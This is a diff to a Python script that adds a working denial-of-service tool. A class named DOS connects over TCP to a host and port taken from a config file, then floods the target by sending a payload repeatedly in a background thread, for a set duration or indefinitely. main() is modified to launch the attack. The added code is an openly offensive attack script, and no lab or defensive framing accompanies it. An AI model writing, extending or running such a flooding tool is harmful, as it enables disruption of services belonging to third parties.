@@ -20,9 +20,13 @@ from typing import (Optional,
                     NoReturn)
 
 # Third party imports
-# from socket import (socket,
-#                     AF_INET,
-#                     SOCK_STREAM,)
+from socket import (socket,
+                    AF_INET,
+                    SOCK_STREAM,)
+from threading import Thread
+
+# Set the path to the root directory
+os.chdir(os.path.dirname(os.path.abspath(__file__)))
 
 # ===== Constants ===== #
 ARGS: list[str] = sys.argv
@@ -76,7 +80,7 @@ def load_config(config_file: Optional[str] = 'config.json', *,
 
         finally:
             file.close()
-
+    logging.info('Configuration file loaded successfully.')
     return _return
 
 def check_config(config: dict) -> tuple[bool, list[str]]:
@@ -135,6 +139,66 @@ def param_handler() -> str:
 class DOS:
     """Main class for the DOS attack.
     """
+    def __init__(self,*,
+                 config: dict,
+                 duration: Optional[int] = -1):
+        """Initialize the DOS class.
+
+        Args:
+            config (dict): The configuration file.
+            duration (int, optional): Time of the attack in seconds. Defaults to -1 (infinite).
+        """
+        self.__host: str = config['host']
+        self.__port: int = config['port']
+        self.__payload: str = config['payload']
+        self.__duration: int = float(duration)
+        self._is_attacking: bool = False
+        self.__socket: socket
+
+    def init_socket(self) -> None:
+        """Initialize the socket for the DOS attack.
+        """
+        self.__socket = socket(AF_INET, SOCK_STREAM)
+        self.__socket.settimeout(10)
+        try:
+            self.__socket.connect((self.__host, self.__port))
+        except TimeoutError:
+            logging.error('Connection timed out.')
+            exit_error()
+        except ConnectionRefusedError:
+            logging.error('Connection refused.')
+            exit_error()
+
+        logging.info('Socket initialized successfully.')
+
+    def attack(self) -> None:
+        """Start the DOS attack.
+        The attack will be run in a separate thread. 
+        While the main thread will wait for the duration.
+        """
+        self._is_attacking = True
+        self.init_socket()
+        attack: Thread = Thread(target=self.__attack)
+        attack.start()
+        if self.__duration > 0:
+            attack.join(self.__duration)
+            self._is_attacking = False
+            logging.info('Attack ended.')
+        else:
+            logging.info('Attack started.')
+
+    def __attack(self) -> None:
+        """The actual attack.
+        """
+        while self._is_attacking:
+            try:
+                self.__socket.sendall(self.__payload.encode())
+            except TimeoutError:
+                logging.error('Connection timed out.')
+                exit_error()
+            except ConnectionRefusedError:
+                logging.error('Connection refused.')
+                exit_error()
 
 # ===== Main ===== #
 def main():
@@ -144,8 +208,9 @@ def main():
     config = load_config(config_file)
     if not check_config(config):
         logging.error('Configuration file is not valid.')
-        return
-
+        exit_error()
+    dos = DOS(config=config, duration=10)
+    dos.attack()
 
 if __name__ == '__main__':
     main()
